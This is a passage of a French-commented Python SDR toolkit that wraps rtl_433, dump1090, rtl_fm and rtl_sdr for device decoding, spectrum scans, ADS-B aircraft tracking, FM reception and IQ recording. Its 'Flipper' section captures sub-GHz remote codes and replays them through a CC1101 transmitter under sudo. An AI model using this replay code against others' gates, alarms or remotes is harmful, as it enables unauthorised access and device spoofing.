            return []

        results = []
        for freq, powers in freq_power.items():
            avg = sum(powers) / len(powers)
            results.append({
                "freq_hz": freq,
                "power_avg": round(avg, 1),
                "power_max": round(max(powers), 1),
                "samples": len(powers),
            })
        return results

    # ── helpers signaux live ─────────────────────────────────────────

    @staticmethod
    def _icon_for_model(model: str) -> str:
        """Icône selon le nom du modèle."""
        ml = model.lower()
        if any(w in ml for w in ("weather", "temp", "thermo",
                                  "acurite", "lacrosse", "oregon")):
            return "🌡️"
        if "tpms" in ml or "tire" in ml:
            return "🚗"
        if any(w in ml for w in ("door", "window", "pir",
                                  "motion", "alarm", "deltadore")):
            return "🚪"
        if any(w in ml for w in ("remote", "button", "keyfob")):
            return "🔑"
        if "smoke" in ml or "fire" in ml:
            return "🔥"
        if any(w in ml for w in ("soil", "rain", "wind")):
            return "🌿"
        if "somfy" in ml or "rts" in ml:
            return "🏠"
        return "📦"

    def _handle_known_signal(self, data: Dict, elapsed: float,
                              base_freq: str, sig_list: List[Dict],
                              sig_index: Dict, ambient_keys: set,
                              calibrated: bool, skip: set):
        """Traite un signal décodé par rtl_433 (protocole connu)."""
        model = data.get("model", "Inconnu")
        sid = str(data.get("id", ""))
        channel = str(data.get("channel", ""))
        key = f"{model}:{sid}:{channel}"

        sig_freq = data.get("freq", "")
        sig_freq_hz = (str(int(float(sig_freq) * 1e6))
                       if sig_freq else base_freq)
        rssi = data.get("rssi", "")
        snr = data.get("snr", "")

        if key in sig_index:
            idx = sig_index[key]
            sig_list[idx]["count"] += 1
            sig_list[idx]["last_seen"] = round(elapsed, 1)
            if rssi != "":
                sig_list[idx]["rssi"] = rssi
            if snr != "":
                sig_list[idx]["snr"] = snr
            for k, v in data.items():
                if k not in skip:
                    sig_list[idx]["data"][k] = v
        else:
            is_ambient = (not calibrated) or (key in ambient_keys)
            entry = {
                "key": key, "model": model, "id": sid,
                "channel": channel, "freq_hz": sig_freq_hz,
                "freq_display": _freq_display(sig_freq_hz),
                "rssi": rssi, "snr": snr,
                "icon": self._icon_for_model(model),
                "count": 1,
                "first_seen": round(elapsed, 1),
                "last_seen": round(elapsed, 1),
                "ambient": is_ambient, "unknown": False,
                "data": {k: v for k, v in data.items()
                         if k not in skip},
            }
            sig_index[key] = len(sig_list)
            sig_list.append(entry)
            if is_ambient:
                ambient_keys.add(key)

            # Log console
            tag = "🔇" if is_ambient else "🆕"
            detail = f"{tag} <b>{model}</b>"
            if sid:
                detail += f" · id:{sid}"
            for k in ("temperature_C", "humidity"):
                v = data.get(k, "")
                if v != "":
                    unit = "°C" if "temp" in k else "%"
                    detail += f" · {v}{unit}"
            bat = data.get("battery_ok", "")
            if bat != "":
                detail += f" · pile {'OK' if bat else '⚠️'}"
            extra = [k for k in data if k not in skip
                     and k not in ("model", "id", "channel",
                                   "temperature_C", "humidity",
                                   "battery_ok")]
            for k in extra[:3]:
                detail += f" · {k}={data[k]}"
            _log(detail)

    def _handle_unknown_signal(self, unk: Dict, elapsed: float,
                                base_freq: str, sig_list: List[Dict],
                                sig_index: Dict, ambient_keys: set,
                                calibrated: bool):
        """Traite un signal inconnu détecté par l'analyse -A de rtl_433."""
        code = unk.get("code", "")
        bits = unk.get("bits", 0)
        if not code or bits < 8:
            return  # bruit (impulsion unique, < 8 bits)

        key = f"UNK:{code}"
        mod = unk.get("mod", unk.get("type", "OOK"))
        rssi = unk.get("rssi", "")
        snr = unk.get("snr", "")

        if key in sig_index:
            idx = sig_index[key]
            sig_list[idx]["count"] += 1
            sig_list[idx]["last_seen"] = round(elapsed, 1)
            if rssi != "":
                sig_list[idx]["rssi"] = rssi
        else:
            is_ambient = (not calibrated) or (key in ambient_keys)
            entry = {
                "key": key,
                "model": f"Inconnu ({mod})",
                "id": code[:16],
                "channel": "",
                "freq_hz": base_freq if not base_freq.startswith("_")
                           else "433920000",
                "freq_display": _freq_display(
                    base_freq if not base_freq.startswith("_")
                    else "433920000"),
                "rssi": rssi, "snr": snr,
                "icon": "❓",
                "count": 1,
                "first_seen": round(elapsed, 1),
                "last_seen": round(elapsed, 1),
                "ambient": is_ambient, "unknown": True,
                "data": {
                    "code": code, "bits": bits,
                    "modulation": mod,
                    "pulses": unk.get("pulses", ""),
                    "short_us": unk.get("short_us", ""),
                    "long_us": unk.get("long_us", ""),
                },
            }
            sig_index[key] = len(sig_list)
            sig_list.append(entry)
            if is_ambient:
                ambient_keys.add(key)

            tag = "🔇" if is_ambient else "🆕"
            detail = (f"{tag} ❓ <b>Signal inconnu</b> · {mod} · "
                      f"{bits} bits · code:{code[:16]}")
            if rssi != "":
                detail += f" · {rssi} dB"
            _log(detail)

    # ──────────────────────────────────────────────────────────────────

    def _rtl433_listen(self, p: Dict) -> Dict:
        """rtl_433 : décode protocoles + cartes live + filtre ambiant."""
        if not self._rtlsdr_ok:
            return {"ok": False, "error": "RTL-SDR non détecté"}
        if not _which("rtl_433"):
            return {"ok": False, "error": "rtl_433 non installé"}

        freq = _resolve_freq(p)
        duration = int(p.get("duration", 60))
        CALIB_SECS = 8

        # Multi-fréquence ou mono
        ALL_ISM = ["433920000", "433420000", "868350000", "315000000"]
        cmd = ["sudo", "timeout", str(duration), "rtl_433"]
        if freq == "_all_ism" or freq == "0":
            for f in ALL_ISM:
                cmd += ["-f", f]
            _log(f"📡 Balayage <b>toutes bandes ISM</b> — "
                 f"433 · 433.42 · 868 · 315 MHz ({duration}s)")
        elif freq.startswith("_range:"):
            # Plage personnalisée → hops tous les ~2 MHz
            bounds = freq[7:].split("-")
            lo, hi = int(bounds[0]), int(bounds[1])
            step = 2_000_000  # 2 MHz par hop
            hops = []
            f = lo
            while f <= hi:
                hops.append(str(f))
                f += step
            if not hops:
                hops = [str(lo)]
            # rtl_433 max ~8 fréquences en hop
            hops = hops[:8]
            for f in hops:
                cmd += ["-f", f]
            _log(f"📡 Balayage <b>{_freq_display(lo)} → "
                 f"{_freq_display(hi)}</b> — {len(hops)} hop(s) ({duration}s)")
        else:
            cmd += ["-f", str(freq)]
            _log(f"📡 Écoute sur <b>{_freq_display(freq)}</b> — {duration}s")
        # -A : analyse les signaux inconnus (sortie stderr)
        cmd += ["-g", "40", "-F", "json", "-M", "time:unix", "-A"]
        _log(f"⏳ Calibration ({CALIB_SECS}s) — ne touche à rien…")

        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Structures cartes live — récupérer ambiants persistants
        sig_list: List[Dict] = []
        sig_index: Dict[str, int] = {}  # clé → index dans sig_list
        ambient_keys: set = set(self._ambient_keys)
        calibrated = False
        last_stream = 0.0
        raw_count = 0

        _SKIP = {"time", "mic", "mod", "freq", "rssi", "snr", "noise",
                 "freq1", "freq2", "len", "num_rows", "rows"}

        # État pour le parsing des signaux inconnus (stderr -A)
        _unk: Dict = {}

        start = time.time()

        while time.time() - start < duration + 2:
            _check_stop()
            if proc.poll() is not None:
                break

            now = time.time()
            elapsed = now - start

            # Fin de calibration
            if not calibrated and elapsed >= CALIB_SECS:
                calibrated = True
                _log(f"✅ Calibration OK — <b>{len(ambient_keys)}</b> "
                     f"source(s) ambiante(s)")
                _log(f"🎯 <b>Appuie sur ta télécommande maintenant !</b>")

            rlist, _, _ = _sel.select(
                [proc.stdout, proc.stderr], [], [], 1.0)
            if not rlist:
                # Stream throttle même sans données
                if now - last_stream >= 1.5 and sig_list:
                    _log(f"__SIGNALS_LIVE__{json.dumps(sig_list)}")
                    last_stream = now
                continue

            # ── stdout : protocoles connus (JSON) ──
            if proc.stdout in rlist:
                line = proc.stdout.readline()
                if line and line.strip():
                    try:
                        data = json.loads(line.strip())
                    except json.JSONDecodeError:
                        data = None
                    if data:
                        raw_count += 1
                        self._handle_known_signal(
                            data, elapsed, freq, sig_list, sig_index,
                            ambient_keys, calibrated, _SKIP)

            # ── stderr : signaux inconnus (analyse -A) ──
            if proc.stderr in rlist:
                sline = proc.stderr.readline()
                if sline:
                    s = sline.strip()
                    # Début d'un nouveau bloc d'analyse
                    if "Detected OOK" in s or "Detected FSK" in s:
                        _unk = {"type": "OOK" if "OOK" in s else "FSK"}
                    # RSSI / SNR
                    m = re.search(
                        r'RSSI:\s*([-\d.]+)\s*dB.*SNR:\s*([-\d.]+)', s)
                    if m:
                        _unk["rssi"] = float(m.group(1))
                        _unk["snr"] = float(m.group(2))
                    # Modulation
                    if "Guessing modulation:" in s:
                        _unk["mod"] = s.split(
                            "Guessing modulation:")[1].strip()
                    # Pulse count
                    m = re.search(r'Total count:\s*(\d+)', s)
                    if m:
                        _unk["pulses"] = int(m.group(1))
                    # Timing (short/long)
                    m = re.search(
                        r'short_width:\s*(\d+),\s*long_width:\s*(\d+)', s)
                    if m:
                        _unk["short_us"] = int(m.group(1))
                        _unk["long_us"] = int(m.group(2))
                    # Code device → signal complet !
                    m = re.search(
                        r'\[\{(\d+)\}([0-9a-fA-F]+)\]', s)
                    if m and _unk:
                        _unk["bits"] = int(m.group(1))
                        _unk["code"] = m.group(2)
                        raw_count += 1
                        self._handle_unknown_signal(
                            _unk, elapsed, freq, sig_list, sig_index,
                            ambient_keys, calibrated)
                        _unk = {}

            # Stream cartes live (throttle 1.5s)
            if now - last_stream >= 1.5 and sig_list:
                _log(f"__SIGNALS_LIVE__{json.dumps(sig_list)}")
                last_stream = now

        if proc.poll() is None:
            proc.terminate()
            proc.wait(timeout=5)

        # Envoi final
        if sig_list:
            _log(f"__SIGNALS_LIVE__{json.dumps(sig_list)}")

        self._last_signals = sig_list
        self._ambient_keys = ambient_keys  # persistant entre scans
        n_new = sum(1 for s in sig_list if not s["ambient"])
        n_amb = sum(1 for s in sig_list if s["ambient"])
        total = len(sig_list)

        if total:
            _log(f"\n📋 <b>Bilan : {total} source(s), "
                 f"{raw_count} émission(s)</b>")
            if n_new:
                _log(f"   🆕 {n_new} nouvelle(s) (après calibration)")
            if n_amb:
                _log(f"   🔇 {n_amb} ambiante(s) (bruit de fond)")
            models: Dict[str, int] = {}
            for s in sig_list:
                models[s["model"]] = models.get(s["model"], 0) + s["count"]
            for m_name, cnt in sorted(models.items(),
                                      key=lambda x: x[1], reverse=True):
                _log(f"   • {m_name} — {cnt} émission(s)")
        else:
            _log(f"📭 Aucun appareil détecté en {duration}s.", "warn")
            _log(f"   Rapproche-toi ou augmente la durée.")

        return {
            "ok": True,
            "signals": total,
            "new_signals": n_new,
            "ambient_signals": n_amb,
            "data": sig_list[:50],
            "message": (f"{total} source(s) : {n_new} nouvelle(s), "
                        f"{n_amb} ambiante(s)." if total
                        else "Aucun appareil détecté."),
        }

    # ════════════════════════════════════════════════════════════════════
    #  FLIPPER — Capture & Replay
    # ════════════════════════════════════════════════════════════════════

    def _flipper_read(self, p: Dict) -> Dict:
        """Mode Flipper : scan + capture + prépare le replay instantané."""
        _log("🎯 <b>Mode Flipper — Capturer & Rejouer</b>")
        _log("   Scan → détection → carte signal → bouton Rejouer")

        # Délègue au moteur rtl433_listen (détecte connu + inconnu)
        result = self._rtl433_listen(p)

        # Sauvegarder les signaux replayables (code + timing)
        replayable = []
        for sig in self._last_signals:
            d = sig.get("data", {})
            code = d.get("code", "")
            if not code or sig.get("ambient"):
                continue
            capture = {
                "key": sig["key"],
                "model": sig["model"],
                "freq_hz": sig["freq_hz"],
                "code": code,
                "bits": d.get("bits", 0),
                "modulation": d.get("modulation", "OOK"),
                "short_us": d.get("short_us", 500),
                "long_us": d.get("long_us", 0),
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            }
            # Dédup par clé
            existing = [i for i, c in enumerate(self._captured_signals)
                        if c["key"] == sig["key"]]
            if existing:
                self._captured_signals[existing[0]] = capture
            else:
                self._captured_signals.append(capture)
            replayable.append(sig)

        if replayable:
            _log(f"\n🎮 <b>{len(replayable)} signal(aux) prêt(s) pour "
                 f"replay</b>")
            for s in replayable:
                d = s.get("data", {})
                code_short = d.get("code", "")[:16]
                mod = d.get("modulation", "OOK")
                _log(f"   📦 {s['model']} · {s['freq_display']} · "
                     f"{mod} · code:{code_short}…")
            _log(f"   💡 Clique sur <b>Rejouer</b> dans la carte signal "
                 f"pour émettre via CC1101.")
        elif result.get("ok") and self._last_signals:
            _log(f"\n⚠️ Signaux détectés mais aucun code exploitable "
                 f"pour le replay.", "warn")
            _log(f"   Les protocoles décodés (météo, TPMS…) n'ont pas "
                 f"de code simple à rejouer.")

        # Limiter l'historique
        self._captured_signals = self._captured_signals[-50:]

        return result

    def _flipper_send(self, p: Dict) -> Dict:
        """Réémet un signal capturé en mode Flipper via CC1101."""
        err = self._require_cc1101()
        if err:
            return err

        code_hex = p.get("code", "").strip()
        freq = _resolve_freq_int(p)
        short_us = int(p.get("short_us", "500") or "500")
        modulation = p.get("modulation", "OOK_MC")
        repeat = int(p.get("repeat", "5"))

        if not code_hex:
            return {"ok": False, "error": "Pas de code à envoyer."}
        # Valider l'hex
        try:
            bytes.fromhex(code_hex)
        except ValueError:
            return {"ok": False,
                    "error": f"Code hex invalide : {code_hex[:32]}"}

        # Baud rate basé sur le timing des pulses
        baud = int(1_000_000 / short_us) if short_us > 0 else 2000

        _log(f"📤 <b>Replay Flipper</b> sur "
             f"<b>{_freq_display(str(freq))}</b>")
        _log(f"   Code : {code_hex[:32]}"
             f"{'…' if len(code_hex) > 32 else ''}")
        _log(f"   Modulation : {modulation} · {baud} baud "
             f"(pulse {short_us} µs)")
        _log(f"   Répétitions : {repeat}×")

        # Générer les octets TX selon la modulation
        manchester = "MC" in modulation.upper()
        if manchester:
            _log(f"   🔧 Encodage Manchester appliqué "
                 f"(données doublées)")

        data_hex_for_script = code_hex
        # Script Python pour CC1101
        tx_script = (
            f"import cc1101, time\n"
            f"code = bytes.fromhex('{data_hex_for_script}')\n"
            f"# Manchester : chaque bit → 2 bits (0→01, 1→10)\n"
            f"manchester = {manchester}\n"
            f"if manchester:\n"
            f"    bits = []\n"
            f"    for byte in code:\n"
            f"        for bp in range(7, -1, -1):\n"
            f"            if (byte >> bp) & 1:\n"
            f"                bits.extend([1, 0])\n"
            f"            else:\n"
            f"                bits.extend([0, 1])\n"
            f"    out = bytearray()\n"
            f"    for i in range(0, len(bits), 8):\n"
            f"        b = 0\n"
            f"        for j, v in enumerate(bits[i:i+8]):\n"
            f"            b |= v << (7 - j)\n"
            f"        out.append(b)\n"
            f"    data = bytes(out)\n"
            f"else:\n"
            f"    data = code\n"
            f"CHUNK = 45\n"
            f"chunks = [data[i:i+CHUNK] for i in range(0, len(data), CHUNK)]\n"
            f"print(f'DATA:{{len(data)}} CHUNKS:{{len(chunks)}}', flush=True)\n"
            f"def safe_tx(t, c):\n"
            f"    for r in range(3):\n"
            f"        try:\n"
            f"            t.transmit(c)\n"
            f"            return True\n"
            f"        except RuntimeError:\n"
            f"            time.sleep(0.02 * (r + 1))\n"
            f"    return False\n"
            f"with cc1101.CC1101() as t:\n"
            f"    t.set_base_frequency_hertz({freq})\n"
            f"    t.set_symbol_rate_baud({baud})\n"
            f"    for i in range({repeat}):\n"
            f"        for c in chunks:\n"
            f"            safe_tx(t, c)\n"
            f"            time.sleep(0.02)\n"
            f"        print(f'TX:{{i+1}}/{repeat}', flush=True)\n"
            f"        time.sleep(0.15)\n"
            f"print('OK')\n"
        )

        def on_line(line):
            if line.startswith("DATA:"):
                parts = line.split()
                sz = parts[0].split(":")[1]
                nb = parts[1].split(":")[1] if len(parts) > 1 else "?"
                _log(f"   📦 {sz} octets TX en {nb} paquets")
            elif line.startswith("TX:"):
                n = line.split(":")[1]
                _log(f"   📤 Transmission <b>{n}</b> envoyée")

        output = _run_live(
            ["sudo", "-n", "/home/kali/nexuspi/.venv/bin/python3",
             "-c", tx_script],
            timeout=30, on_line=on_line)

        if "OK" in output:
            _log(f"✅ Signal rejoué <b>{repeat}×</b> — si c'est un "
                 f"code fixe, le récepteur devrait réagir.")
            return {"ok": True, "transmissions": repeat,
                    "message": f"Signal rejoué {repeat} fois."}
        else:
            err_msg = output.strip()[-200:] if output.strip() else "erreur"
            _log(f"❌ Replay échoué : {err_msg}", "error")
            return {"ok": False, "error": err_msg}

    # ──────────────────────────────────────────────────────────────────

    def _detect_signals(self, p: Dict) -> Dict:
        """Scan rapide pour détecter des signaux actifs."""
        if not self._rtlsdr_ok:
            return {"ok": False, "error": "RTL-SDR non détecté"}

        band = p.get("band", "ism433")
        duration = int(p.get("duration", 20))

        bands = {
            "ism433": ("430M", "435M"),
            "ism868": ("866M", "870M"),
            "ism315": ("313M", "317M"),
            "all":    ("300M", "928M"),
        }
        freq_start, freq_end = bands.get(band, ("430M", "435M"))

        band_names = {"ism433": "433 MHz (Europe/ISM)", "ism868": "868 MHz (Europe)",
                      "ism315": "315 MHz (US/Asie)", "all": "toutes les bandes ISM"}
        _log(f"🔎 Recherche de signaux actifs — <b>{band_names.get(band, band)}</b>")
        _log(f"   Scan de {freq_start} à {freq_end} pendant {duration}s…")

        out_csv = SDR_DIR / "detect.csv"
        bin_size = "100k" if band == "all" else "25k"
        cmd = [
            "sudo", "timeout", str(duration),
            "rtl_power",
            "-f", f"{freq_start}:{freq_end}:{bin_size}",
            "-g", "40",
            "-i", "1",
            "-1",
            str(out_csv),
        ]
        subprocess.run(cmd, capture_output=True, timeout=duration + 10)
        results = self._parse_spectrum_csv(out_csv)

        if not results:
            _log("📭 Bande silencieuse — aucun appareil n'émet.", "warn")
            _log("   Essaie à un autre moment ou rapproche-toi de la source.")
            return {"ok": True, "signals": 0,
                    "message": "Aucun signal actif détecté."}

        noise_floor = sorted([r["power_avg"] for r in results])[
            len(results) // 4]
        active = [r for r in results if r["power_max"] > noise_floor + 10]

        if active:
            active.sort(key=lambda x: x["power_max"], reverse=True)
            _log(f"📶 <b>{len(active)} signal(aux) actif(s) trouvé(s)</b> :")
            for i, s in enumerate(active[:15]):
                strength = s["power_max"] - noise_floor
                bar = "█" * max(1, int(strength / 3))
                label = "puissant" if strength > 25 else "moyen" if strength > 15 else "faible"
                _log(f"   {i+1}. <b>{_freq_display(str(s['freq_hz']))}</b> "
                     f"· +{strength:.0f} dB · {label}  {bar}")
            _log(f"   💡 Utilise « Décodage rtl_433 » sur ces fréquences "
                 f"pour identifier les appareils.")
        else:
            _log(f"📭 Aucun signal au-dessus du bruit (plancher : "
                 f"{noise_floor:.0f} dB).", "warn")

        return {
            "ok": True,
            "signals": len(active),
            "noise_floor": noise_floor,
            "active": active[:20],
            "message": f"{len(active)} signal(aux) actif(s) détecté(s)."
                       if active else "Bande silencieuse.",
        }

    # ──────────────────────────────────────────────────────────────────

    def _adsb(self, p: Dict) -> Dict:
        """ADS-B : tracking avions à 1090 MHz."""
        if not self._rtlsdr_ok:
            return {"ok": False, "error": "RTL-SDR non détecté"}

        duration = int(p.get("duration", 60))

        # Essayer dump1090, sinon rtl_adsb
        if _which("dump1090"):
            return self._adsb_dump1090(duration)
        elif _which("rtl_adsb"):
            return self._adsb_rtl(duration)
        else:
            return {"ok": False,
                    "error": "Ni dump1090 ni rtl_adsb installé. "
                             "sudo apt install dump1090-mutability"}

    def _adsb_rtl(self, duration: int) -> Dict:
        """Fallback ADS-B via rtl_adsb."""
        _log(f"✈️ Écoute du trafic aérien sur <b>1090 MHz</b> ({duration}s)…")
        _log(f"   Chaque avion émet son identifiant ICAO et sa position.")
        proc = subprocess.Popen(
            ["sudo", "timeout", str(duration), "rtl_adsb"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        aircraft = {}
        start = time.time()
        while time.time() - start < duration + 2:
            _check_stop()
            if proc.poll() is not None:
                break
            elapsed = int(time.time() - start)
            if elapsed % 20 == 0 and elapsed > 0:
                _log(f"⏳ Écoute… {elapsed}/{duration}s — "
                     f"{len(aircraft)} avion(s) captés")
            rlist, _, _ = _sel.select([proc.stdout], [], [], 1.0)
            if rlist:
                line = proc.stdout.readline().strip()
                if line and line.startswith("*"):
                    msg = line.strip("*;")
                    if len(msg) >= 14:
                        icao = msg[2:8]
                        aircraft[icao] = aircraft.get(icao, 0) + 1
                        if aircraft[icao] == 1:
                            _log(f"✈️ Avion détecté — ICAO <b>{icao.upper()}</b>")

        if proc.poll() is None:
            proc.terminate()

        self._last_adsb = [{"icao": k, "msgs": v}
                           for k, v in aircraft.items()]
        if aircraft:
            _log(f"\n✈️ <b>{len(aircraft)} avion(s) dans le ciel</b>")
            for a in self._last_adsb:
                _log(f"   • ICAO {a['icao'].upper()} — {a['msgs']} messages")
        else:
            _log(f"📭 Aucun avion capté en {duration}s.", "warn")
            _log(f"   L'antenne livrée avec le RTL-SDR est courte. "
                 f"En extérieur ou avec une antenne plus grande, la portée "
                 f"atteint ~150 km.")
        return {"ok": True, "aircraft": len(aircraft), "data": self._last_adsb,
                "message": f"{len(aircraft)} avion(s) détecté(s)."
                           if aircraft else "Aucun avion capté."}

    def _adsb_dump1090(self, duration: int) -> Dict:
        """ADS-B via dump1090 (plus complet)."""
        _log(f"✈️ Écoute du trafic aérien sur <b>1090 MHz</b> ({duration}s)…")
        _log(f"   Chaque avion émet son identifiant ICAO et sa position.")
        proc = subprocess.Popen(
            ["sudo", "timeout", str(duration), "dump1090",
             "--raw", "--net-none", "--quiet"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        aircraft = {}
        start = time.time()
        while time.time() - start < duration + 2:
            _check_stop()
            if proc.poll() is not None:
                break
            elapsed = int(time.time() - start)
            if elapsed % 20 == 0 and elapsed > 0:
                _log(f"⏳ Écoute… {elapsed}/{duration}s — "
                     f"{len(aircraft)} avion(s) captés")
            rlist, _, _ = _sel.select([proc.stdout], [], [], 1.0)
            if rlist:
                line = proc.stdout.readline().strip()
                if line and line.startswith("*"):
                    msg = line.strip("*;")
                    if len(msg) >= 14:
                        icao = msg[2:8]
                        aircraft[icao] = aircraft.get(icao, 0) + 1
                        if aircraft[icao] == 1:
                            _log(f"✈️ Avion détecté — ICAO <b>{icao.upper()}</b>")

        if proc.poll() is None:
            proc.terminate()

        self._last_adsb = [{"icao": k, "msgs": v}
                           for k, v in aircraft.items()]
        if aircraft:
            _log(f"\n✈️ <b>{len(aircraft)} avion(s) dans le ciel</b>")
            for a in self._last_adsb:
                _log(f"   • ICAO {a['icao'].upper()} — {a['msgs']} messages")
        else:
            _log(f"📭 Aucun avion capté en {duration}s.", "warn")
            _log(f"   L'antenne livrée avec le RTL-SDR est courte. "
                 f"En extérieur ou avec une antenne plus grande, la portée "
                 f"atteint ~150 km.")
        return {"ok": True, "aircraft": len(aircraft), "data": self._last_adsb,
                "message": f"{len(aircraft)} avion(s) détecté(s)."
                           if aircraft else "Aucun avion capté."}

    # ──────────────────────────────────────────────────────────────────

    def _fm_listen(self, p: Dict) -> Dict:
        """Récepteur FM broadcast."""
        if not self._rtlsdr_ok:
            return {"ok": False, "error": "RTL-SDR non détecté"}
        if not _which("rtl_fm"):
            return {"ok": False, "error": "rtl_fm non installé"}

        freq_raw = p.get("frequency", "96.0")
        # Si "Personnalisé" sélectionné, prendre la valeur custom
        freq_mhz = p.get("freq_custom", freq_raw) if freq_raw == "_custom" else freq_raw
        duration = int(p.get("duration", 15))

        freq_hz = str(int(float(freq_mhz) * 1e6))
        wav_file = SDR_DIR / "fm_capture.raw"

        _log(f"📻 Réception FM sur <b>{freq_mhz} MHz</b> ({duration}s)…")
        cmd = [
            "sudo", "timeout", str(duration),
            "rtl_fm", "-f", freq_hz, "-M", "fm",
            "-s", "200000", "-r", "48000",
            "-g", "40",
            str(wav_file),
        ]
        res = subprocess.run(cmd, capture_output=True, text=True,
                             errors="replace", timeout=duration + 10)

        if wav_file.exists() and wav_file.stat().st_size > 1000:
            size_kb = wav_file.stat().st_size // 1024
            _log(f"📻 Signal FM capté — <b>{size_kb} KB</b> enregistrés")
            _log(f"   Fichier : {wav_file}")
            return {"ok": True, "file": str(wav_file), "size_kb": size_kb,
                    "message": f"Signal FM {freq_mhz} MHz capté ({size_kb} KB)."}
        else:
            _log(f"📭 Pas de station FM sur {freq_mhz} MHz.", "warn")
            _log(f"   Essaie une fréquence locale (ex: France Inter 87.8, "
                 f"NRJ 100.3, RTL 104.3…)")
            return {"ok": True,
                    "message": f"Pas de station FM sur {freq_mhz} MHz."}

    # ════════════════════════════════════════════════════════════════════
    #  CAPTURE — RTL-SDR
    # ════════════════════════════════════════════════════════════════════

    def _capture_iq(self, p: Dict) -> Dict:
        """Capture IQ brute avec monitoring d'énergie temps réel."""
        if not self._rtlsdr_ok:
            return {"ok": False, "error": "RTL-SDR non détecté"}
        if not _which("rtl_sdr"):
            return {"ok": False, "error": "rtl_sdr non installé"}

        freq = _resolve_freq(p)
        sample_rate = p.get("sample_rate", "2048000")
        gain = int(p.get("gain", 40))
        duration = int(p.get("duration", 10))
        samples = int(float(sample_rate)) * duration

        _ensure_capture_dir()
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        out_file = CAPTURE_DIR / f"{freq}_{timestamp}.iq"

        _log(f"📼 Capture IQ brute sur <b>{_freq_display(freq)}</b>")
        _log(f"   Gain: {gain} dB · durée: {duration}s")

        cmd = [
            "sudo", "timeout", str(duration + 5),
            "rtl_sdr",
            "-f", str(freq),
            "-s", str(sample_rate),
            "-g", str(gain),
            "-n", str(samples),
            str(out_file),
        ]
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        start = time.time()
        last_pos = 0
        burst_count = 0
        in_burst = False
        last_log_sec = -1

        while proc.poll() is None and time.time() - start < duration + 5:
            _check_stop()
            elapsed = time.time() - start
            sec = int(elapsed)

            peak, avg, last_pos = _read_energy(out_file, last_pos)
            bar = _energy_bar(peak)

            if peak > 15 and not in_burst:
                in_burst = True
                burst_count += 1
                _log(f"   📡 <b>Activité détectée</b> à {elapsed:.1f}s ! "
                     f"{bar}")
            elif peak <= 10 and in_burst:
                in_burst = False

            if sec != last_log_sec and sec > 0 and sec % 2 == 0:
                last_log_sec = sec
                status = "📡 activité" if in_burst else "silence"
                _log(f"   ⏺️ {sec}/{duration}s  {bar}  {status}")

            time.sleep(0.5)

        if proc.poll() is None:
            proc.terminate()
            proc.wait(timeout=5)

        if out_file.exists() and out_file.stat().st_size > 0:
            size_kb = out_file.stat().st_size // 1024
            DATA_DIR.mkdir(parents=True, exist_ok=True)
            shutil.copy2(out_file, DATA_DIR / out_file.name)
            _log(f"✅ Capture enregistrée — <b>{out_file.name}</b> "
                 f"({size_kb} KB)")
            if burst_count:
                _log(f"   📊 <b>{burst_count} burst(s)</b> d'activité")
            _log(f"   💡 Analysable avec GNU Radio ou Universal Radio Hacker")
            return {"ok": True, "file": str(out_file), "size_kb": size_kb,
                    "message": f"Capture IQ enregistrée ({size_kb} KB)."}
        else:
            _log("❌ La capture est vide.", "error")
            _log("   Le RTL-SDR n'a pas pu capturer de données. "
                 "Vérifie la connexion USB.")
            return {"ok": False, "error": "Capture IQ échouée — fichier vide."}

    # ──────────────────────────────────────────────────────────────────

    def _record_signal(self, p: Dict) -> Dict:
        """Enregistre un signal sub-GHz avec monitoring d'énergie temps réel."""
        if not self._rtlsdr_ok:
            return {"ok": False, "error": "RTL-SDR non détecté"}

        freq = _resolve_freq(p)
        gain = int(p.get("gain", 49))
        duration = int(p.get("duration", 10))

        _ensure_capture_dir()
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        out_file = CAPTURE_DIR / f"{freq}_{timestamp}.raw"

        _log(f"⏺️ Enregistrement sur "
             f"<b>{_freq_display(freq)}</b> ({duration}s)")
        _log(f"   Gain : {gain} dB · sample rate : 250 kHz")
        _log(f"   📱 <b>Appuie sur la télécommande / le bouton maintenant !</b>")

        cmd = [
            "sudo", "timeout", str(duration + 3),
            "rtl_sdr",
            "-f", str(freq),
            "-s", "250000",
            "-g", str(gain),
            "-n", str(250000 * duration),
            str(out_file),
        ]
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        # ── Monitoring temps réel de l'énergie ──
        start = time.time()
        last_pos = 0
        bursts: List[float] = []   # timestamps des débuts de burst
        in_burst = False
        last_log_sec = -1
        THRESH_ON = 15    # seuil de détection (déviation uint8 vs 128)
        THRESH_OFF = 10   # seuil retour au silence (hystérésis)

        while proc.poll() is None and time.time() - start < duration + 5:
            _check_stop()
            elapsed = time.time() - start
            sec = int(elapsed)

            # Lire l'énergie courante du fichier
            peak, avg, last_pos = _read_energy(out_file, last_pos)
            bar = _energy_bar(peak)

            # Détection de burst (transition silence → signal)
            if peak > THRESH_ON and not in_burst:
                in_burst = True
                bursts.append(round(elapsed, 1))
                _log(f"   📡 <b>Signal détecté</b> à {elapsed:.1f}s ! "
                     f"{bar}")
            elif peak <= THRESH_OFF and in_burst:
                in_burst = False

            # Log de progression toutes les secondes
            if sec != last_log_sec and sec > 0:
                last_log_sec = sec
                status = "📡 activité" if in_burst else "silence"
                _log(f"   ⏺️ {sec}/{duration}s  {bar}  {status}")

            time.sleep(0.5)

        if proc.poll() is None:
            proc.terminate()
            proc.wait(timeout=5)

        if not out_file.exists() or out_file.stat().st_size == 0:
            _log("❌ Rien capté.", "error")
            _log("   Assure-toi d'appuyer sur la télécommande pendant "
                 "l'enregistrement, à proximité de l'antenne.")
            return {"ok": False, "error": "Aucun signal capturé."}

        size_kb = out_file.stat().st_size // 1024
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        shutil.copy2(out_file, DATA_DIR / out_file.name)

        # ── Résumé des bursts détectés ──
        if bursts:
            _log(f"✅ Signal enregistré — <b>{out_file.name}</b> ({size_kb} KB)")
            times = ", ".join(f"{t}s" for t in bursts[:10])
            _log(f"   📊 <b>{len(bursts)} burst(s)</b> détecté(s) à : {times}")
        else:
            _log(f"⚠️ Enregistrement terminé — <b>{out_file.name}</b> "
